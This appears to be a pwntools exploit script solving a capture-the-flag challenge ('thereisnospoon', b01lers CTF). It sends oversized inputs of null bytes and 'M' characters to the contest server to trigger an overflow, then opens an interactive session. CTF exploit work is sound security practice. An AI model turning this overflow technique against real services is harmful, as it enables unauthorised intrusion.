#!/usr/bin/env python3

from pwn import *

exe = ELF("./thereisnospoon-3b08fb627c71c8c2149d1e57d98a1934")

context.binary = exe


def conn():
        return process([exe.path])


def main():
    #r = conn()
    r = remote("chal.ctf.b01lers.com", 1006)
    pause()
    r.sendlineafter("Neo, enter your matrix: ", "\x00"*255)
    pause()
    r.sendlineafter("Make your choice: ", b"M"*256)
    
    r.interactive()


if __name__ == "__main__":
    main()
